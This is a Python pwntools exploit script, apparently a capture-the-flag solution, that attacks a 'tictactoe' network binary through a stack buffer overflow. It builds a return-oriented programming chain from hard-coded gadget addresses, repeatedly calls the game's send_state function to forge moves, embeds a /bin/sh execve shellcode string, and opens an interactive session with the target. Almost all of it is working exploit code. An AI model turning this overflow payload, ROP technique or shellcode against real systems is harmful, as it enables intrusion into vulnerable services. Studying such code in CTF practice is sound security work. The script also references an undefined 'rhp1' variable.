#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./tictactoe"

rhp2 = {'host':"localhost",'port':8889}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

show_flag = 0x40195f
case1 = 0x0401d94
case6 = 0x0401e82
init_array = 0x405000
pop_rdi = 0x0040310b
pop_rsi_r15 = 0x00403109
pop_r14_r15 = 0x00403108
name = 0x405770
reg_user = 0x4016b4
send3 = 0x401e31
send_message = 0x401768
server_ip = 0x405728
session = 0x405740
send_state = 0x402a74
jmp_rax = 0x0040120c

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"



def exploit(conn):
  conn.recvuntil("name: ")
  raw_input()

  #first 17 byte would be copied to name buffer
  #else to the stack(temp_name)
  inj = "A"*9 #overwritten as board
  inj += "\x59\xc3" #pop rcx; ret
  inj += "\x5a\xc3" #pop rdx; ret
  inj += "\x58\xc3" #pop rax; ret
  inj += "A"*(0x10-len(inj))
  inj += "127.0.0.1\0"
  inj += "A"*(0x20-len(inj))
  inj += "A"*(0x50-len(inj))
  inj += "A"*8 #rbp
  
  inj += p64(pop_rdi)
  inj += p64(name)
  inj += p64(reg_user) #ここまででsession取得
  
  temp = len(inj)

  for i in range(3):
    inj += p64(pop_rdi) #server_ip用意
    inj += p64(name+0x10)
    inj += p64(pop_rsi_r15) #sessionID用意
    inj += p64(session)
    inj += p64(0)           
    inj += p64(name+9)  #hmove用意
    inj += p64(2)
    inj += p64(name+9+2) #cmove用意
    inj += p64(0)
    inj += p64(send_state)
    
    inj += p64(pop_rdi) #server_ip用意
    inj += p64(name+0x10)
    inj += p64(pop_rsi_r15) #sessionID用意
    inj += p64(session)
    inj += p64(0)           
    inj += p64(name+9)  #hmove用意
    inj += p64(5)
    inj += p64(name+9+2) #cmove用意
    inj += p64(1)
    inj += p64(send_state)
    
    inj += p64(pop_rdi) #server_ip用意
    inj += p64(name+0x10)
    inj += p64(pop_rsi_r15) #sessionID用意
    inj += p64(session)
    inj += p64(0)           
    inj += p64(name+9)  #hmove用意
    inj += p64(8)
    inj += p64(name+9+2) #cmove用意
    inj += p64(6)
    inj += p64(send_state)


    print(hex(i) + " : " + hex(len(inj)))
    #nameじゃないよ。スタックに積んでるんだよ
    #inj += p64(name+9+4) #戻る
    #inj += p64(name+temp)
    #inj += p64(jmp_rax)

   
  conn.sendline(inj) #発火
    



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

